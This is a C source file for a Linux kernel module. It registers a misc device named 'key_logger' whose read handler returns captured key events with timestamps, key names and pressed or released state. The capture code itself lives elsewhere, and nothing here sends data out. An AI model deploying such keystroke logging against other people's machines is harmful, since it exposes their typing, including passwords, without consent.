#include "keyboard.h"

static int		misc_open(struct inode *inode, struct file *filp);
static int		misc_release(struct inode *inode, struct file *filp);
static ssize_t	misc_read(struct file *filp, char *buffer, size_t length, loff_t *offset);

static struct miscdevice		misc_device;
const struct file_operations	f_ops = {
	.owner = THIS_MODULE,
	.open = misc_open,
	.release = misc_release,
	.read = misc_read,
	/*.write = misc_write,*/
};

extern t_key	*first;

static int	misc_open(struct inode *inode, struct file *filp)
{
	pr_info("device opened\n");
	return 0;
}

static int	misc_release(struct inode *inode, struct file *filp)
{
	pr_info("device closed\n");
	return 0;
}

static ssize_t		misc_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
	t_key	*tmp = first;
	char	*log = NULL;
	char	buff[128] = {0};
	size_t	len	= 0;

	while (tmp) {
		sprintf(buff, "%.2lu:%.2lu:%.2lu, %12s, (%02d), %s\n",
				(tmp->time.tv_sec / 3600) % (24), (tmp->time.tv_sec / 60) % (60),
				tmp->time.tv_sec % 60, tmp->name, tmp->key, tmp->state ? "pressed" : "released");

		if (log == NULL) {
			log = (char *)kcalloc(strlen(buff) + 1, sizeof(char), GFP_KERNEL);
		} else {
			log = (char *)krealloc(log, strlen(log) + strlen(buff) + 1, GFP_KERNEL);
		}
		if (log == NULL)
			return -1;

		log = strcat(log, buff);

		tmp = tmp->next;
	}

	if (log != NULL) {
		len = simple_read_from_buffer(buffer, length, offset, log, strlen(log));
		kfree(log);
	}

	return len;
}

int	create_misc(void)
{
	int	retval;

	misc_device.minor = MISC_DYNAMIC_MINOR;
	misc_device.name = "key_logger";
	misc_device.fops = &f_ops;

	retval = misc_register(&misc_device);
	if (retval == -1) {
		pr_err("misc_register() failure\n");
		return retval;
	}

	pr_info("New misc device : %s, 10, %i\n", misc_device.name, misc_device.minor);

	return 0;
}

void	destroy_misc(void)
{
	misc_deregister(&misc_device);
}
